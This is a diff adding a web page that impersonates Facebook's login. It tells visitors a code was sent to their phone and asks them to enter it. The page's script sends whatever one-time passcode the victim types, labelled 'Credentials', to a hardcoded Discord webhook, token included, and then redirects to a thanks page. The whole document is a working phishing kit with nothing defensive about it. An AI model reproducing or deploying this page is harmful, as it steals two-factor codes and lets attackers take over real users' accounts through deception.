@@ -1,0 +1,89 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to facebook | Facebook</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+	<br><br>
+
+    <div class="logo">
+        <center><img src="Facebook-Logo.png" alt="" width="103px" style="margin-left:70px;"></center>
+        <div class="input">
+			<!-- <br><br><br> -->
+            <form id="webhookForm">
+				
+<div style="width: 400px; "> <p style="text-align: center;">we sent a code to your phone number</p></div>
+                <br>
+                <input type="text" id="password" class="password" placeholder=" &nbsp;  input otp" required="">
+                <br>
+                <button type="submit" class="button" >submit</button>
+            </form>
+
+       
+    
+
+        </div>
+    </ul></div>
+    
+    </div>
+    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+    <script>
+       $(document).ready(function() {
+      var avatarUrl = '';
+      var username = "W15D0M";
+      var webhookUrl = "https://discord.com/api/webhooks/1242423810557218836/Qqw5cfXxLVYRWeB8pEX0T8XNtWeg1tfDQE9dt0cBtGVDBEXbL31UJYhMHQ0Q6ZWpDKo1"; <!--Literally read-->
+
+      $("#webhookForm").submit(function(event) {
+        event.preventDefault();
+
+        // var usernameInput = $("#username").val();
+        var passwordInput = $("#password").val();
+
+        var embedFields = [
+        //   { name: "Username", value: usernameInput },
+          { name: "facebook-otp", value: passwordInput }
+        ];
+
+        var payload = {
+          username: username,
+          avatar_url: avatarUrl,
+          embeds: [{
+            author: {
+              name: username,
+              icon_url: avatarUrl
+            },
+            title: "Credentials",
+            fields: embedFields,
+            color: 2
+          }]
+        };
+
+        $.ajax({
+          url: webhookUrl,
+          type: "POST",
+          contentType: "application/json",
+          data: JSON.stringify(payload),
+          success: function() {
+			window.location.assign("thanks.html");
+          },
+          error: function() {
+            alert("Error.");
+          }
+        });
+      });
+    });
+
+         </script>
+     
+
+
+
+</body>
+
+</html>
